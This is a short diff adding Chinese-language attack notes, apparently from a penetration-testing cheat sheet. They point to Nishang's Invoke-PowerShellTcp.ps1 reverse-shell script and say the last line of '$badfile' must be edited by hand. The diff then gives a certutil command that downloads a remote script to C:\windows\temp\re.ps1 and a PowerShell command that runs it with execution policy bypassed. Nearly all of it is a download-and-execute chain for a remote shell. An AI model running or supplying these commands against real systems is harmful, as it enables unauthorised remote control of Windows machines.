@@ -1,0 +1,4 @@
+官方地址：https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+>需要自己修改$badfile最后一行内容
+certutil -urlcache -split -f $downloadurl C:\windows\temp\re.ps1
+powershell -ExecutionPolicy Bypass -File "C:\windows\temp\re.ps1"
